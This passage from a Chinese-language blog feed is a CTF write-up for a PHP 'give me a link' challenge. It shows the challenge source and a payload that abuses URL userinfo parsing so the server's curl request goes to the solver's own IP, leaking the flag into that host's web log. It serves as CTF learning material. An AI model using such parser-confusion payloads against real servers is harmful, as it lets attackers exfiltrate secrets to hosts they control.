alt="8"></p><p>分割线————————————————————————————————————————————————–</p><p>其实这道题埋了一个伏笔。照题目给的代码 CURLOPT_RETURNTRANSFER 设置为true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br></pre></td></tr></table></figure><p>这并没有将那个文件里面的信息显示出来,也没有复制给变量.这该如何是好。重新回到题目。可以简述为三个问题。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="string">url参数里面需要有http://加上请求包中host变量</span>  <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="string">下划线</span>   <span class="string">get</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span><span class="string">访问http[s]://host/.$flag</span>               <span class="literal">no</span></span><br></pre></td></tr></table></figure><p>1,3问题需要解决，1可以解决，修改头部就可以，至于3，由于没有回显，只能寻找web日志的帮助。在此查看文档得：</p><p><img src="http://myndtt.github.io/images/33.png" alt="33"></p><p>url=<a href="http://solveme.safflower.kr:1@自己ip/plz%1Agive%1Ame" target="_blank" rel="noopener">http://solveme.safflower.kr:1@自己ip/plz%1Agive%1Ame</a></p><p>至于这个payload，最后访问的就是http://自己IP/.$flag，在日志中可以找到flag了</p><p><img src="http://myndtt.github.io/images/34.png" alt="34"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h3&gt;&lt;p&gt;今天再做一道CTF题感觉挺有意思的。&lt;/p&gt;
&lt;p&gt;题目链接 &lt;a href=&quot;http://solveme.safflower.kr/prob/give_me_a_link&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://solveme.safflower.kr/prob/give_me_a_link&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;__DIR__&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;/lib.php&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $url = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/^https?\:\/\/&#39;&lt;/span&gt;.$_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;HTTP_HOST&#39;&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;/i&#39;&lt;/span&gt;, $url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Not allowed URL&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/_|\s|\0/&#39;&lt;/span&gt;, $url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Not allowed character&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $parse = parse_url($url);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(basename($parse[&lt;span class=&quot;string&quot;&gt;&#39;path&#39;&lt;/span&gt;]) !== &lt;span class=&quot;string&quot;&gt;&#39;plz_give_me&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Not allowed path&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $ch = curl_init();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       curl_setopt($ch, CURLOPT_URL, $parse[&lt;span class=&quot;string&quot;&gt;&#39;scheme&#39;&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;://&#39;&lt;/span&gt;.$parse[&lt;span class=&quot;string&quot;&gt;&#39;host&#39;&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;.$flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       curl_setopt($ch, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       curl_exec($ch);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       curl_close($ch);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Okay&amp;lt;hr&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;代码比较简单，无非就是几个绕过。 主要就是后面的两个正则感觉挺有意思，很显然焦点在于下划线。其实RFC明确禁止将下划线作为域名的一部分，容易造成误解破坏网络秩序。但是以前做的题中也有出现参数中带有点或者&lt;/p&gt;
&lt;p&gt;空格变成下划线的例子。就是那一道smile的题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="audit" scheme="https://myndtt.github.io/tags/audit/"/>
    
  </entry>
  
</feed>
